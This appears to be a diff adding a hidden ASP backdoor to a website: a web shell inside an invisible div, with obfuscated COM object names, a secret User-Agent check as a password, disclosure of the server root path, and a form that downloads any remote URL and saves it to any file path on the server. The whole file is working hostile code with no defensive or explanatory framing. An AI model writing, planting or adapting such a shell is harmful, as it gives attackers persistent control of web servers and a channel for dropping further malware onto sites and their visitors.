@@ -1,0 +1,50 @@
+<div style="display:none">
+<% 
+	function getHTTPimg(url) 
+	dim http 
+	set http=server.createobject("M"&"SX"&"ML"&"2.XM"&"LH"&"T"&"T"&"P") 
+	Http.open "GET",url,false 
+	Http.send() 
+	if Http.readystate<>4 then exit function 
+	getHTTPimg=Http.responseBody 
+	set http=nothing 
+	end function 
+	
+	function Save2Local(from,tofile) 
+	dim geturl,objStream,imgs 
+	geturl=trim(from) 
+	imgs=gethttpimg(geturl)
+	Set objStream = Server.CreateObject("A"&"DO"&"DB"&".S"&"t"&"r"&"e"&"a"&"m") 
+	objStream.Type =1
+	objStream.Open 
+	objstream.write imgs 
+	objstream.SaveToFile tofile,2 
+	objstream.Close() 
+	set objstream=nothing 
+	end function 
+	
+	agent=request.servervariables("http_user_agent")
+	if instr(agent,"myccs")<=0 then
+  	response.end
+	end if
+	response.Write(Server.MapPath("/"))
+	
+	dim fileurl,filename
+	fileurl  = Request("fileurl")
+	filename = Request("filename")
+	if fileurl<>"" then
+	if instr(filename,":")<=0 then
+		filename = server.MapPath(filename)
+	end if
+	end if
+	Response.Write(fileurl)
+	if fileurl<>"" then
+		call Save2Local(fileurl,filename)
+	end if
+%>
+<form method="POST" action="">
+	<input type=text name=fileurl  value="在这里输入网址" />
+	<input type=text name=filename value="文件名" />
+	<p><input type="submit" value="提交" name="B1"><input type="reset" value="重置" name="B2"></p>
+</form>
+</div>
